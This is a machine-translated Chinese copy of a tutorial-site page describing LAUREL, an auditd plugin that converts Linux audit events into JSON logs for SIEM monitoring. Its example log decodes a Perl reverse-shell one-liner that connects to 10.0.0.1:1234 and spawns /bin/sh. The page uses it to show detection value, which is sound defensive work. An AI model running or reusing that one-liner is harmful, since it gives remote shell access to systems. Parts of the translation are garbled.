# Laurel:为 SIEM 的使用转换 Linux 审计日志

> 原文：<https://kalilinuxtutorials.com/laurel/>

[![](img/35351538fcb834e645cc0dfdca469ec1.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi2C0O4esSB3KC6FinXy-4ykql59KsBnWsuQqNfJnR8vrR9mODxXvaD3L8fz2g5hnRvYv_08viO2R-_0UX0HNiZdr0eBXKPj22prE8SB-PQlbKzxIhCenT4xKFiXjQNqz_ma9CluBgo6_uDyXrje2FIbLXdx8JxSc7JQk52X-ZeWZPcvtVs8gi3MsRp/s728/laurel-svg%20(1).png)

**LAUREL** 是 *auditd(8)* 的一个事件后处理插件，以提高其在现代安全监控设置中的可用性。

## 为什么？

TLDR:而不是像这样的审计事件…

**type = exec ve msg = audit(1626611363.720:348501):argc = 3 A0 = " perl " a1 = "-e " a2 = 75736520536 f 636 b 65743 b 24693d 2231302 e 302 e 302 e 31223 b 24703d 313233343 b 736 f 636 b 636 b 65742……**

…将它们转换成 JSON 日志，在这些日志中，您的笔测试人员/red teamers/攻击者试图制造的混乱一目了然:

**{ … "EXECVE":{ "argc": 3，" ARGV": ["perl "，"-e "，"使用 Socket$ I = \ " 10 . 0 . 0 . 1 \ "；$ p = 1234socket(S，PF_INET，SOCK_STREAM，getprotobyname(\ " TCP \ ")；if(connect(S，sockaddr_in($p，inet _ aton($ I))){ open(STDIN，\ ">&S \ ")；open(STDOUT，\ ">&S \ ")；open(STDERR，\ ">&S \ ")；exec(\ "/bin/sh-I \ ")；};"]}，…}**

## 描述

Linux 审计子系统和 *auditd(8)* 生成的日志包含在 SIEM 环境中非常有用的信息(如果配置了有用的规则集)。然而，这种格式并不太适合大规模分析:事件通常被分割成不同的行，这些行必须使用消息标识符进行合并。文件和程序执行是通过`PATH`和`EXECVE`元素记录的，但是字符串的有限字符集导致许多条目是十六进制编码的。有关更详细的讨论，请参见实际的 *auditd(8)* 问题。

*LAUREL* 通过消费审计事件、解析审计事件并将其转换为更多数据，然后以基于 JSON 的日志格式写出，同时保持原始审计日志中的所有信息不变，从而解决了这些问题。它不会取代 *auditd(8)* 作为来自内核的审计消息的消费者。相反，它使用 *audisp* (“审计分派”)接口通过 *auditd(8)* 接收消息。因此，它可以与审计事件的其他消费者(例如，一些 EDR 产品)和平共处。

有关日志格式的描述，请参考基于 JSON 的日志格式。

我们开发这个工具是因为我们不满足于现有项目和产品的特性集和性能特征。详情请参考性能。

## 关于审计规则的一句话

审计规则集的良好起点是 https://github.com/Neo23x0/auditd,，但一般来说，任何规则集都可以。只有当*事件结束*记录未被禁止时，月桂才能正常工作

`**-a always,exclude -F msgtype=EOE**`

应该被删除。

## 有背景的事件

由系统调用或文件系统规则引起的每个事件都用引起该事件的进程的父进程的信息进行了注释。如果可用，`id`指向对应于该进程的最后一个`execve`系统调用的消息:

**" PARENT _ INFO ":{
" ID ":" 1643635026.276:327308 "，
"comm": "sh "，
"exe": "/usr/bin/dash "，
"ppid": 1532
}**

## 添加更多上下文:键和流程标签

审计事件可以包含一个键，一个可用于过滤事件的短字符串。 *LAUREL* 可以配置为识别这样的键，并将它们作为键添加到导致事件的流程中。这些标签也可以传播到子进程。这有助于避免日志分析中昂贵的类似 JOIN 的操作来过滤无害的事件。

考虑以下为 *apt* 和 *dpkg* 调用设置键的规则:

**-w /usr/bin/apt-get -p x -k 软件 _ 管理**

与记录 *execve(2)* 和变体的规则集一起，这将导致由`**apt-get**`及其子流程直接引起的每个事件被标记为`**software_mgmt**`。

例如，在配置了一些源代码的 Debian/bullseye 系统上运行`**sudo apt-get update**`，可以在 *LAUREL 的*审计日志中观察到以下标记为`**software_gmt**`的子流程:

*   **T2`apt-get update`**
*   **T2`/usr/bin/dpkg --print-foreign-architectures`**
*   **T2`/usr/lib/apt/methods/http`**
*   **T2`/usr/lib/apt/methods/https`**
*   **T2`/usr/lib/apt/methods/https`**
*   **T2`/usr/lib/apt/methods/http`**
*   **T2`/usr/lib/apt/methods/gpgv`**
*   **T2`/usr/lib/apt/methods/gpgv`**
*   **T2`/usr/bin/dpkg --print-foreign-architectures`**
*   **T2`/usr/bin/dpkg --print-foreign-architectures`**

这种跟踪也适用于软件包的安装或删除。如果某个软件包的安装后脚本表现可疑，SIEM 分析师将能够通过检查单个事件与软件安装过程建立联系。

[**Download**](https://github.com/threathunters-io/laurel)